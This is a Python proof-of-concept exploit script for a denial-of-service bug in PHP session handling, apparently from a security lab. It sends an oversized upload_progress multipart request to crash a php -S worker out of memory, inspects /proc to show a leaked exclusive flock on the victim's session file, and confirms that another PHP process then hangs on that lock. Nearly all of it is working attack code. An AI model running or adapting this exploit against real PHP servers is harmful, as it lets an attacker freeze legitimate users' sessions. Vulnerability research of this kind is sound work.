#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cross-worker flock DoS proof:
1. Poison php -S worker P (pid=N) with an upload_progress OOM request (sid=X).
2. After the OOM, P's leaked ps_files struct keeps fd with flock(LOCK_EX) open
   on sess_X — no rshutdown ran (modules_activated=0).
3. Independent PHP process B tries flock(LOCK_EX) on sess_X -> BLOCKS forever.
   (In php-fpm/prefork, B is another worker in the pool serving a legitimate
   request of the victim's SID — that request never returns.)
"""
import http.client, os, subprocess, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8095
SESS_DIR = sys.argv[2] if len(sys.argv) > 2 else '/home/wh1t3r0se/php2shell-lab/final_demo/sess'
SID = 'xworker%07d' % int(time.time())

def mpart(fields, files):
    out = b''
    for name, val in fields:
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"\r\n\r\n'
                % name.encode()) + val + b'\r\n'
    for fld, fname, data in files:
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"; filename="%b"\r\n\r\n'
                % (fld.encode(), fname.encode())) + data + b'\r\n'
    return out + b'--BND--\r\n'

def post(body, timeout=60):
    c = http.client.HTTPConnection('127.0.0.1', PORT, timeout=timeout)
    c.request('POST', '/', body, {
        'Content-Type': 'multipart/form-data; boundary=BND',
        'Content-Length': str(len(body))})
    r = c.getresponse(); r.read(); c.close()
    return r.status

BIG = 'A' * 262144
files = [('f%d' % i, BIG, b'x') for i in range(20)]
body = mpart([('PHPSESSID', SID.encode()), ('PHP_SESSION_UPLOAD_PROGRESS', b'poc')], files)
t0 = time.time()
st = post(body)
print('[1/3] poison -> HTTP %d (%.1fs)' % (st, time.time() - t0))

# 2) leaked fd proof: find server pid via /proc (php -S process on port PORT)
def find_server_pid():
    for pid in os.listdir('/proc'):
        if not pid.isdigit(): continue
        try:
            cmd = open('/proc/%s/cmdline' % pid, 'rb').read().replace(b'\x00', b' ').decode()
            if 'php -S 127.0.0.1:%d' % PORT in cmd:
                return int(pid)
        except Exception:
            pass
    return None

pid = find_server_pid()
print('[2/3] server pid=%s' % pid)
sess_file = os.path.join(SESS_DIR, 'sess_' + SID)
leaked_fds = []
if pid:
    for fd in os.listdir('/proc/%d/fd' % pid):
        try:
            tgt = os.readlink('/proc/%d/fd/%s' % (pid, fd))
            if sess_file in tgt:
                leaked_fds.append((fd, tgt))
        except OSError:
            pass
print('[2/3] leaked fds on %s: %s' % (sess_file, leaked_fds or 'NONE (lock released)'))
print('      xfs locks table:')
print(open('/proc/locks').read() if False else '', end='')
locks = open('/proc/locks').read().splitlines()
mypid_ino = None
for fd, tgt in leaked_fds:
    _, ino = os.readlink('/proc/%d/fdinfo/%s' % (pid, fd)), None
    try:
        ino = open('/proc/%d/fdinfo/%s' % (pid, fd)).read().split(' ')[1].strip()
        for l in locks:
            if ino in l.split() or 'WRITE' in l.upper():
                print('      %s' % l)
    except Exception as e:
        print('      (fdinfo failed: %s)' % e)

# 3) independent process B tries the lock -> should hang
print('[3/3] launching INDEPENDENT php process trying flock on %s' % sess_file)
b = subprocess.Popen(
    ['php', '-r', 'echo "B: got lock\n";' if False else
     '$f=fopen(%r, "r"); if ($f===false) { echo "B: open failed\n"; exit(1); }; flock($f, LOCK_EX); echo "B: got lock\n";' % ('/' + sess_file,)],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = b.communicate(timeout=8)
    print('      B finished: %s' % out.strip())
except subprocess.TimeoutExpired:
    b.kill(); b.wait()
    print('      B BLOCKED > 8s -> flock(LOCK_EX) hangs on the leaked lock. DoS CONFIRMED.')
    print('      In php-fpm/prefork, B = another worker serving the victim SID.')
